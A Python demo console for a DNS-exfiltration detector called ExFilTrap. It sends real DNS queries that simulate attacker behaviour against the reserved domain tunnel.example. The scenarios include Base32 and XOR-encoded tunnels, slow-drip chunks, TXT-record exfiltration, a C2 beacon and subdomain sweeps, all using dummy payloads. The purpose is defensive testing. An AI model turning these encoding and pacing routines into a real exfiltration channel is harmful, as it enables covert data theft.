#!/usr/bin/env python3
"""ExFilTrap Attack Console — interactive live-demo driver.

One terminal, one menu: pick an attacker behaviour, watch it run, and read
the verdict straight off the running engine's localhost API. Built for
project demos — you cannot wait for a real attacker, so this plays one.

Why a terminal console and not a GUI app:
  * zero packaging risk (stdlib only, runs on any python3, even over SSH);
  * the desktop dashboard is already the visual showpiece — this console
    is the attacker + referee, and prints exactly what to show next.

The traffic is REAL DNS sent through the real resolver, so the engine's
live capture sees it on the wire exactly as it would an intrusion. All
synthetic payloads use the IETF-reserved documentation domain
(`tunnel.example`) — nothing here touches a real system.

Usage:
  python3 tools/demo_console.py                  # interactive menu
  python3 tools/demo_console.py --list           # scenario catalogue
  python3 tools/demo_console.py --scenario smash_grab --intensity high
  python3 tools/demo_console.py --story          # scripted full demo
"""

from __future__ import annotations

import argparse
import base64
import json
import random
import socket
import struct
import subprocess
import sys
import threading
import time
import urllib.request

API = "http://127.0.0.1:5050"
STUB = "127.0.0.53"                 # systemd-resolved (loopback session)
DEFAULT_TUNNEL = "tunnel.example"   # IETF-reserved for documentation

EVERYDAY = ["google.com", "youtube.com", "wikipedia.org", "github.com",
            "cloudflare.com", "netflix.com", "openai.com", "ubuntu.com",
            "mint.org", "stackoverflow.com", "amazon.com", "linkedin.com"]
SCARY = ["ransomware.com", "c2server.com", "botnet-zombie.io",
         "malware-download.net", "darkweb-c2.ru", "keylogger-shop.com"]
PHONETIC = ["bavoke", "taminor", "kelupa", "soravi", "mudane", "revaso",
            "nuveda", "latomi", "gesura", "vokemi", "dapula", "piloc"]


# ----------------------------------------------------------------- engine IO
def api(path: str):
    with urllib.request.urlopen(API + path, timeout=5) as r:
        return json.load(r)


def engine_info():
    try:
        s = api("/api/status")
        return s
    except Exception:
        return None


def snap() -> dict:
    t = api("/api/stats")["totals"]
    return {"queries": t["queries"], "flagged": t["flagged"],
            "confirmed": t["confirmed"], "blocked": t["blocked"]}


def upstream_resolver() -> str:
    """The real LAN/upstream resolver (queries must leave via the NIC the
    engine captures)."""
    try:
        out = subprocess.run(["resolvectl", "dns"], capture_output=True,
                             text=True, timeout=5).stdout
        for token in out.split():
            if token.count(".") == 3 and not token.startswith("127."):
                return token
    except Exception:
        pass
    return "1.1.1.1"


# ------------------------------------------------------------- DNS machinery
class DnsSender:
    """Raw UDP DNS query sender (user space, no root needed)."""

    def __init__(self, server: str):
        self.server = server
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sent = 0

    def query(self, name: str, qtype: int = 1, txid: int | None = None):
        qname = b"".join(bytes([len(p)]) + p.encode()
                         for p in name.split(".")) + b"\x00"
        msg = struct.pack(">HHHHHH", (txid or self.sent + 1) & 0xFFFF,
                          0x0100, 1, 0, 0, 0) + qname + \
            struct.pack(">HH", qtype, 1)
        self.sock.sendto(msg, (self.server, 53))
        self.sent += 1

    def close(self):
        self.sock.close()


def paced(s: DnsSender, names, qps: float, rng: random.Random, jitter=0.15):
    """Send names at ~qps with relative jitter; shows inline progress."""
    interval = 1.0 / qps
    t0 = time.time()
    for i, name in enumerate(names):
        remain = t0 + interval * (1 + rng.uniform(-jitter, jitter)) * (i + 1)
        delay = remain - time.time()
        if delay > 0:
            time.sleep(delay)
        s.query(name)
        if (i + 1) % 5 == 0 or i == len(names) - 1:
            print(f"\r    packets sent: {i + 1}/{len(names)}   ",
                  end="", flush=True)
    print()


# ------------------------------------------------------- payload constructors
def b32_qname(payload: bytes, tunnel: str, chunk: int = 50) -> str:
    enc = base64.b32encode(payload).decode().rstrip("=")
    return ".".join(enc[i:i + chunk] for i in range(0, len(enc), chunk)) \
        + "." + tunnel


def xor_key_stream(key: bytes, plain: bytes) -> bytes:
    """XOR `plain` under a repeating keystream — index-free (the per-chunk
    index lives in the payload text, not the cipher loop)."""
    return bytes(b ^ key[n % len(key)] for n, b in enumerate(plain))


def phonetic_label(rng) -> str:
    return "-".join(rng.choice(PHONETIC) for _ in range(2))


# ------------------------------------------------------------------ intensity
INTENSITY = {
    "low":    dict(note="gentle — quick to run, still detectable"),
    "medium": dict(note="realistic middle ground"),
    "high":   dict(note="full-throttle — the version evaluators remember"),
}


# ------------------------------------------------------------------ scenarios
# Each scenario: key, title, story (what to tell the evaluators), expect,
# and run(sender, rng, intensity, tunnel) -> list of names sent (informational)
SCENARIOS: list[dict] = []


def scenario(key, title, story, expect):
    def deco(fn):
        SCENARIOS.append(dict(key=key, title=title, story=story,
                              expect=expect, run=fn))
        return fn
    return deco


@scenario("smash_grab", "Smash-and-grab mass dump",
          "attacker dumps a whole file at once — loud Base32 tunnel at high "
          "query rate",
          "flagged + CONFIRMED with decoded payloads (dashboard → Alerts ▸ "
          "CONFIRMED)")
def smash_grab(s, rng, it, tunnel):
    cfg = {"low": (12, 3.0), "medium": (25, 5.0), "high": (40, 8.0)}[it]
    n, qps = cfg
    names = [b32_qname(b"QUARTERLY-RESULTS-XLSX " + bytes([i]) * 2,
                       tunnel) for i in range(n)]
    paced(s, names, qps, rng)


@scenario("ramp_up", "Careful attacker ramping up",
          "attacker starts tiny and slow, probes your defenses, then "
          "escalates rate and payload — the realistic intrusion arc",
          "flagged climbs as the session mass grows (dashboard → Sessions)")
def ramp_up(s, rng, it, tunnel):
    cfg = {"low": 16, "medium": 24, "high": 36}[it]
    names = []
    for i in range(cfg):
        frac = i / max(cfg - 1, 1)
        size = int(4 + frac * 24)          # 4B → 28B payload
        interval = 4.0 - frac * 3.3        # ~4s → ~0.7s
        enc = base64.b32encode(b"stage" + bytes([i]) * size).decode()
        names.append((enc[:60] + "." + tunnel, interval))
    t0 = time.time()
    for i, (name, interval) in enumerate(names):
        remain = t0 + interval * (i + 1)
        if remain > time.time():
            time.sleep(remain - time.time())
        s.query(name)
        if (i + 1) % 4 == 0 or i == len(names) - 1:
            print(f"\r    packets sent: {i + 1}/{len(names)}   ",
                  end="", flush=True)
    print()


@scenario("slow_drip_hex", "Encrypted slow-drip (hex chunks)",
          "XOR-encrypted ~32–48B chunks every ~3.6s — low-rate stealth "
          "exfil; 16+ queries/min to one zone trips the velocity gate on "
          "any baseline",
          "HIGH velocity/slow-drip alerts (dashboard → Alerts)")
def slow_drip_hex(s, rng, it, tunnel):
    # 16 q in 60s to one base domain trips the per-domain velocity gate
    # (DOMAIN_VELOCITY_COUNT=15, entropy>=3.0) — deterministic on any baseline
    cfg = {"low": (16, 4.2, 3.4), "medium": (18, 4.0, 3.2),
           "high": (22, 3.4, 2.8)}[it]
    n, tmax, tmin = cfg
    key = rng.randbytes(16)
    for i in range(n):
        plain = f"chunk-{i}-of-secret-document".encode()
        # 32-48B chunks: still a slow, low-rate drip, but each query
        # carries enough entropy-weighted mass to clear the session
        # elevation gate (1.8x population mean) even on a busy baseline
        # where prior loud attacks raised the learned population mass
        enc = xor_key_stream(key, plain)[: rng.randint(32, 48)]
        s.query(enc.hex() + "." + tunnel)
        print(f"\r    packets sent: {i + 1}/{n}   ", end="", flush=True)
        if i < n - 1:
            time.sleep(rng.uniform(tmin, tmax))
    print()


@scenario("glacial_drip", "Glacial drip (the patient attacker)",
          "one small encrypted fragment every ~15–30s — 'death by a "
          "thousand cuts'. The hardest regime: no per-query alert, and the "
          "stateful verdict needs minutes of accumulation on a clean "
          "baseline",
          "watch the fragments appear silently in Live Queries; alerts "
          "accrue over time (honest demo: show the difficulty, then the "
          "burst act catches the same attacker later)")
def glacial_drip(s, rng, it, tunnel):
    cfg = {"low": (3, 15.0), "medium": (5, 20.0), "high": (6, 30.0)}[it]
    n, base = cfg
    key = rng.randbytes(16)
    for i in range(n):
        plain = f"fragment-{i}-of-large-file".encode()
        enc = xor_key_stream(key, plain)[:34]
        s.query(enc.hex() + "." + tunnel)
        print(f"\r    packets sent: {i + 1}/{n}   ", end="", flush=True)
        if i < n - 1:
            time.sleep(base + rng.uniform(-2, 2))
    print()


@scenario("phonotactic_stealth", "Phonotactic stealth labels",
          "pronounceable, individually-benign-looking labels (Al Musa '25) "
          "paced at human-like intervals — evades per-query classifiers",
          "stateful session analysis catches it (mass accumulation)")
def phonotactic_stealth(s, rng, it, tunnel):
    cfg = {"low": (8, 7.0), "medium": (14, 6.0), "high": (20, 5.0)}[it]
    n, gap = cfg
    names = [f"{phonetic_label(rng)}.sync.{tunnel}" for _ in range(n)]
    paced(s, names, 1.0 / gap, rng, jitter=0.0)


@scenario("nested_enc", "Double-obfuscated tunnel",
          "XOR-encrypted THEN Base32-encoded THEN split into DNS labels — "
          "for when the attacker hides even the encoding",
          "high-entropy labels + CONFIRMED decodes via base32 layer")
def nested_enc(s, rng, it, tunnel):
    cfg = {"low": (10, 3.0), "medium": (18, 5.0), "high": (30, 7.0)}[it]
    n, qps = cfg
    key = rng.randbytes(16)
    names = []
    for i in range(n):
        plain = f"double-secret-{i}".encode()
        names.append(b32_qname(xor_key_stream(key, plain), tunnel))
    paced(s, names, qps, rng)


@scenario("beacon_c2", "Machine-periodic C2 beacon",
          "implant checking in at an EXACT interval to ONE c2 domain, zero "
          "jitter — timing is the fingerprint no payload can hide",
          "HIGH 'beacon regularity: machine-periodic query timing (M3b)' "
          "alerts once ≥20 exact-interval check-ins accumulate")
def beacon_c2(s, rng, it, tunnel):
    cfg = {"low": (22, 5.5), "medium": (24, 5.2), "high": (30, 5.0)}[it]
    n, period = cfg
    # Dedicated zone: base_domain() keeps the last two labels, so a
    # c2.tunnel.example beacon collapses into 'tunnel.example' and the
    # timing series mixes with every other scenario. 'c2beacon.example'
    # is its own base domain → pure exact-interval series.
    domain = "c2beacon.example"
    for i in range(n):
        s.query(f"hb{i:03d}." + domain)
        print(f"\r    beacons: {i + 1}/{n} (exact {period:.1f}s period)   ",
              end="", flush=True)
        if i < n - 1:
            time.sleep(period)
    print()


@scenario("dns_sweep", "Subdomain enumeration sweep",
          "attacker mass-enumerates a zone with random subdomains — "
          "reconnaissance, not exfil, but the volume pattern is distinct",
          "volume + entropy HIGHs on the target zone")
def dns_sweep(s, rng, it, tunnel):
    cfg = {"low": (16, 3.0), "medium": (28, 5.0), "high": (40, 8.0)}[it]
    n, qps = cfg
    names = ["".join(rng.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                     for _ in range(rng.randint(8, 20))) + ".enum." + tunnel
             for _ in range(n)]
    paced(s, names, qps, rng)


@scenario("mixed_smoke", "Attack hidden in benign noise",
          "normal browsing traffic runs the whole time while a tunnel "
          "hides inside it — the realistic network, and the hardest case",
          "flagged tunnel rows among clean everyday rows in Live Queries")
def mixed_smoke(s, rng, it, tunnel):
    cfg = {"low": (10, 2.5, 2.0), "medium": (16, 3.0, 2.5),
           "high": (24, 4.0, 3.0)}[it]
    n, qps, bgqps = cfg
    stop = threading.Event()

    def background():
        bs = DnsSender(STUB)
        while not stop.is_set():
            bs.query(rng.choice(EVERYDAY))
            time.sleep(1.0 / bgqps)
        bs.close()

    th = threading.Thread(target=background, daemon=True)
    th.start()
    try:
        names = [b32_qname(b"hidden-in-crowd " + bytes([i]) * 2, tunnel)
                 for i in range(n)]
        paced(s, names, qps, rng)
        time.sleep(2)
    finally:
        stop.set()
        th.join(timeout=3)


@scenario("txt_exfil", "TXT-record exfiltration",
          "same tunnel payloads but queried as TXT records — protocol "
          "variation attackers use to slip past naive filters",
          "qname-mass detection is qtype-agnostic: still flagged")
def txt_exfil(s, rng, it, tunnel):
    cfg = {"low": (10, 3.0), "medium": (18, 5.0), "high": (28, 7.0)}[it]
    n, qps = cfg
    names = [b32_qname(b"TXT-EXFIL " + bytes([i]) * 2, tunnel)
             for i in range(n)]
    interval = 1.0 / qps
    t0 = time.time()
    for i, name in enumerate(names):
        remain = t0 + interval * (i + 1)
        if remain > time.time():
            time.sleep(remain - time.time())
        s.query(name, qtype=16)
        if (i + 1) % 5 == 0 or i == len(names) - 1:
            print(f"\r    packets sent: {i + 1}/{len(names)}   ",
                  end="", flush=True)
    print()


@scenario("scary_benign", "False-positive trap (control)",
          "30 everyday domains mixed with scary-looking but harmless names "
          "— a good engine flags little or none of it",
          "LOW risk rows in Live Queries; clean rate stays high — proves "
          "precision, not just recall")
def scary_benign(s, rng, it, tunnel):
    names = [rng.choice(EVERYDAY) for _ in range(30)] + \
            [rng.choice(SCARY) for _ in range(12)]
    rng.shuffle(names)
    paced(s, names, 2.0, rng)


# ------------------------------------------------------------------- running
def print_verdict(before: dict, settle: float = 4.0,
                  zone: str = DEFAULT_TUNNEL, since: float = 0.0):
    time.sleep(settle)
    try:
        after = snap()
    except Exception as e:
        print(f"  (engine unreachable for verdict: {e})")
        return
    print("  ── verdict (engine API) " + "─" * 34)
    print(f"   engine deltas (whole machine, background included): "
          f"queries {after['queries'] - before['queries']:+d}, "
          f"flagged {after['flagged'] - before['flagged']:+d}, "
          f"confirmed {after['confirmed'] - before['confirmed']:+d}")
    try:
        ev = api("/api/events?limit=300")["events"]
        fresh = [e for e in ev if e.get("ts", 0) >= since - 1.0]
        zone_ev = [e for e in fresh if zone in e.get("qname", "")]
        if zone_ev:
            import collections
            by = collections.Counter(e["risk_level"] for e in zone_ev)
            print(f"   THIS attack ({zone}): "
                  + ", ".join(f"{k} ×{v}" for k, v in sorted(by.items())))
            conf = [e for e in zone_ev if e["risk_level"] == "CONFIRMED"]
            for e in (conf or zone_ev)[:3]:
                dec = (e.get("decoded_preview") or e.get("decoded")
                       or "").replace("\n", " ")[:44]
                print(f"     {e['risk_level']:9s} {e['qname'][:44]:44s}"
                      f" {dec}")
        else:
            print(f"   THIS attack ({zone}): no alerts raised — for "
                  "quiet/control scenarios that is the PASS result")
    except Exception:
        pass
    print("  ─" * 22)
    print("  dashboard: http://127.0.0.1:5050  →  Overview for counters, "
          "Alerts ▸ CONFIRMED for decodes")


def run_scenario(sc: dict, intensity: str, tunnel: str, up: str) -> None:
    print()
    print("═" * 66)
    print(f"  {sc['title']}   [intensity: {intensity}]")
    print("═" * 66)
    print(f"  story : {sc['story']}")
    print(f"  expect: {sc['expect']}")
    if intensity == "high" and sc["key"] == "glacial_drip":
        print("  note  : high glacial takes ~3 minutes — patience is the "
              "attack")
    try:
        before = snap()
    except Exception:
        before = None
        print("  ⚠ engine API unreachable — traffic still sends, but no "
              "verdicts (is the service running?)")
    sender = DnsSender(up)
    t0 = time.time()
    try:
        sc["run"](sender, random.Random(int(time.time())), intensity, tunnel)
    finally:
        sender.close()
    print(f"  done in {time.time() - t0:.0f}s — {sender.sent} DNS queries "
          f"via {up}")
    if before is not None:
        # beacon lives on its own dedicated zone (see scenario)
        zone = "c2beacon.example" if sc["key"] == "beacon_c2" else tunnel
        print_verdict(before, zone=zone, since=t0)
        if sc["key"] == "beacon_c2":
            try:
                ss = api("/api/sessions").get("sessions", [])
                hit = [x for x in ss if x.get("beacon")
                       or x.get("domain_beacon")]
                if hit:
                    for x in hit:
                        print(f"  ✅ session beacon flag: {x['src_ip']} "
                              f"cv={x.get('interval_cv')}")
                else:
                    print("  (per-session BEACON chip needs one IP's traffic "
                          "to be only beacons — on a shared desktop IP the "
                          "M3b alerts above are the verdict)")
            except Exception:
                pass


def demo_story(tunnel: str, up: str) -> None:
    """Scripted sequence for presenting: benign wash → escalating attacker.
    Narration printed between acts; run the dashboard on a projector."""
    by_key = {s["key"]: s for s in SCENARIOS}
    acts = [
        ("scary_benign", "low",
         "ACT 1 — a normal network. Everyday browsing plus scary-looking "
         "but harmless names. Watch the clean rate stay high."),
        ("ramp_up", "low",
         "ACT 2 — an attacker arrives. Starts tiny, probes, escalates. "
         "The session tracker is learning."),
        ("beacon_c2", "low",
         "ACT 3 — the implant checks in at machine-regular intervals. "
         "Timing analysis (Sessions ▸ BEACON) is the fingerprint."),
        ("slow_drip_hex", "medium",
         "ACT 4 — data starts leaving: encrypted chunks, low and slow. "
         "Each query alone looks harmless; the zone-velocity and mass "
         "analysis light up."),
        ("smash_grab", "high",
         "ACT 5 — impatient, the attacker dumps everything. Base32 "
         "tunnel at full rate — watch CONFIRMED decodes climb on the "
         "dashboard, then open Alerts ▸ CONFIRMED to show the recovered "
         "payloads."),
    ]
    for key, inten, narration in acts:
        print("\n" + "▄" * 66)
        print(narration)
        print("▄" * 66)
        try:
            input("  ⏎ press Enter to run this act (Ctrl-C to abort)… ")
        except KeyboardInterrupt:
            print("\nstory aborted")
            return
        run_scenario(by_key[key], inten, tunnel, up)
    print("\n=== story complete — close on the Overview counters and the "
          "CONFIRMED alert table ===")


# ---------------------------------------------------------------------- menu
MENU_ORDER = ["smash_grab", "ramp_up", "nested_enc", "slow_drip_hex",
              "glacial_drip", "phonotactic_stealth", "beacon_c2",
              "dns_sweep", "txt_exfil", "mixed_smoke", "scary_benign"]


def menu(tunnel: str, up: str) -> None:
    while True:
        print()
        print("╔" + "═" * 62 + "╗")
        print("║ ExFilTrap ATTACK CONSOLE — pick what the attacker does   ║")
        print("╚" + "═" * 62 + "╝")
        for i, key in enumerate(MENU_ORDER, 1):
            sc = next(s for s in SCENARIOS if s["key"] == key)
            print(f"  {i:2d}. {sc['title']:38s} [{key}]")
        print("   S. full demo story (scripted, 5 acts — for presenting)")
        print("   Q. quit")
        try:
            choice = input("choice: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if choice in ("q", "quit", "exit"):
            return
        if choice in ("s", "story"):
            demo_story(tunnel, up)
            continue
        if not choice.isdigit() or not 1 <= int(choice) <= len(MENU_ORDER):
            print("  ? try a number, S, or Q")
            continue
        sc = next(s for s in SCENARIOS if s["key"] == MENU_ORDER[int(choice) - 1])
        it = input("intensity — low / medium / high [low]: ").strip().lower()
        it = it if it in INTENSITY else "low"
        run_scenario(sc, it, tunnel, up)


# ---------------------------------------------------------------------- main
def main(argv=None) -> int:
    global API
    p = argparse.ArgumentParser(
        prog="demo_console",
        description="Interactive attack/traffic simulator for live "
                    "ExFilTrap demos (real DNS, safe doc-domain payloads).")
    p.add_argument("--list", action="store_true",
                   help="print the scenario catalogue and exit")
    p.add_argument("--scenario", choices=[s["key"] for s in SCENARIOS],
                   help="run one scenario non-interactively")
    p.add_argument("--intensity", choices=list(INTENSITY), default="low")
    p.add_argument("--story", action="store_true",
                   help="run the scripted 5-act demo story")
    p.add_argument("--tunnel", default=DEFAULT_TUNNEL,
                   help=f"attack zone label (default {DEFAULT_TUNNEL})")
    p.add_argument("--api", default=API, help="engine API base URL")
    a = p.parse_args(argv)

    API = a.api

    if a.list:
        print(f"{'key':20s} {'title':38s} expect")
        print("─" * 100)
        for s in SCENARIOS:
            print(f"{s['key']:20s} {s['title']:38s} {s['expect'][:40]}")
        return 0

    up = upstream_resolver()
    info = engine_info()
    print(f"engine API : {API}")
    if info:
        up_s = info.get("uptime_s", 0)
        print(f"engine     : mode={info.get('mode')}  uptime={up_s:.0f}s  "
              f"root={info.get('is_root')}")
        if up_s < 300:
            print("  ⚠ engine baseline is still warming (<5 min uptime); "
                  "stateful detections sharpen with a few minutes of "
                  "normal traffic — run ACT 1 or 'scary_benign' first.")
    else:
        print("  ⚠ ENGINE NOT REACHABLE — traffic will still be sent on "
              "the wire, but verdicts need the service on 127.0.0.1:5050.")
    print(f"resolver   : {up}   attack zone: {a.tunnel}")
    print("(synthetic payloads only — tunnel.example is IETF-reserved; "
          "no real system is targeted)")

    if a.scenario:
        sc = next(s for s in SCENARIOS if s["key"] == a.scenario)
        run_scenario(sc, a.intensity, a.tunnel, up)
        return 0
    if a.story:
        demo_story(a.tunnel, up)
        return 0
    menu(a.tunnel, up)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
